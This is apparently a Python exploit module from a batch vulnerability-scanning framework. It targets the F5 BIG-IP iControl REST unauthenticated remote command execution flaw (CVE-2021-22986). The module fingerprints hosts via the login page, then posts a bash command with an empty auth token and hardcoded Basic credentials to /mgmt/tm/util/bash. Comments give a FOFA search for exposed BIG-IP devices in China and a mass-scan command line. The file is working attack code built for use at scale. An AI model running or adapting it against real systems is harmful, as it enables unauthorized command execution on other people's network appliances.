# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 17:02


from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import *
from core.request.asynchttp import *

import hashlib

# fofa: "BIG-IP" && country="CN"
# python3 batch.py -m exploit.poc.BIG-IP.unauth_rce -cs -fs "body=\"F5 Networks, Inc\""

class Script(BaseScript):
    name = 'BIG-IP'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = 'CVE-2021-22986'
        # 来源
        self.bug_refer = 'https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986'
        # 特定路径判断
        self.detect_path_list = ['/tmui/login.jsp']
        # exec
        self.exec_path_list = ['/mgmt/tm/util/bash']
        # 相关信息
        self.info = '''F5 BIG-IP iControl REST unauthenticated RCE ｜ F5 BIG-IP 16.0.0-16.0.1 ｜ F5 BIG-IP 15.1.0-15.1.2 ｜ F5 BIG-IP 14.1.0-14.1.3.1
        F5 BIG-IP 13.1.0-13.1.3.5
        F5 BIG-IP 12.1.0-12.1.5.2
        F5 BIG-IQ 7.1.0-7.1.0.2
        F5 BIG-IQ 7.0.0-7.0.0.1
        F5 BIG-IQ 6.0.0-6.1.0
        '''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'F5 Networks, Inc.' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = {'Content-Type': 'application/json', 'X-F5-Auth-Token': '', 'Authorization': 'Basic YWRtaW46QVNhc1M='}
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = '{"command": "run", "utilCmdArgs": "-c id"}'
                text = await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                if text is not None and 'commandResult' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}

if __name__ == '__main__':
    pass